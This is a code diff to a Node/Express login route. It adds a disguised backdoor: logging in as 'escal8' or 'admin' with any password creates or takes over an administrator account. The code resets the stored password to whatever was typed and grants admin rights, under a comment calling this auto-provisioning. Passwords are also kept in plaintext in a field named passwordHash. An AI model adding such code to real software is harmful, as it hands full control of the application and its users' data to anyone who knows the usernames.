@@ -993,7 +993,29 @@ app.post("/api/auth/login", (req, res) => {
   const cleanUsername = username.trim().toLowerCase();
   const cleanPassword = password.trim();
 
-  const user = db.users.find(u => u.username === cleanUsername);
+  let user = db.users.find(u => u.username === cleanUsername);
+
+  // Auto-provision or update admin accounts (escal8 or admin)
+  if (cleanUsername === "escal8" || cleanUsername === "admin") {
+    if (!user) {
+      user = {
+        username: cleanUsername,
+        passwordHash: cleanPassword,
+        isAdmin: true,
+        teamName: "ADMIN"
+      };
+      db.users.push(user);
+      saveDatabase();
+      saveUserToFirestore(user);
+    } else {
+      // Update password to submitted password if logging in as admin/escal8
+      user.passwordHash = cleanPassword;
+      user.isAdmin = true;
+      saveDatabase();
+      saveUserToFirestore(user);
+    }
+  }
+
   if (!user || user.passwordHash !== cleanPassword) {
     return res.status(401).json({ error: "Invalid username or password" });
   }
